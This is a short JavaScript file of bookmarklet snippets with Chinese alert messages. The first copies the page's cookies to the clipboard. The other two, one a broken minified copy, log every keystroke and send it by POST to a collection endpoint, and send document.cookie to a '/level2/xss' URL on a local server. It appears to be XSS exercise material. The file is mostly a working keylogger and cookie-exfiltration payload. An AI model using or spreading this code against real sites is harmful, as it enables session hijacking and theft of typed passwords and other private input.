// for cookie
javascript: (() => {
    _ = (n) => {
        for (i in (r = document.cookie.split(";"))) {
            var a = r[i].split("=");
            if (a[0].trim() == n) return a[1];
        }
    };
    c = _("account_id") || alert("无效的 Cookie , 请重新登录!");
    c &&
        navigator.clipboard.writeText(document.cookie) &&
        alert(" Cookie 已经成功获取, 点击确定将 Cookie 复制到剪贴板。");
})();
// for keyboard
javascript: () => {
    document.onkeypress = (e) => {
        l = "";
        l += e.key;
        d = new Date();
        tx = `[${d}] - key: ${e.key}`
        console.log(tx);
        u = "https://127.0.0.1:5000/level2/key"
        var req = new XMLHttpRequest();
        req.open("POST",u , true);
        req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        req.send("data=" + tx);
    };
    document.onload = () => {
        _ = document.cookie;
        h = new XMLHttpRequest();
        t = "https://127.0.0.1:5000/level2/xss?s=" + _;
        h.open("GET", t, true);
        h.send();
    };
};
javascript: ()=>{document.onkeypress=(e)=>{l="";l+=e.key;d=new Date();tx=`[${d}]-key:${e.key}`console.log(tx);u="https://127.0.0.1:5000/level2/key"var req=new XMLHttpRequest();req.open("POST",u,true);req.setRequestHeader("Content-type","application/x-www-form-urlencoded");req.send("data="+tx)};document.onload=()=>{_=document.cookie;h=new XMLHttpRequest();t="https://127.0.0.1:5000/level2/xss?s="+_;h.open("GET",t,true);h.send()}};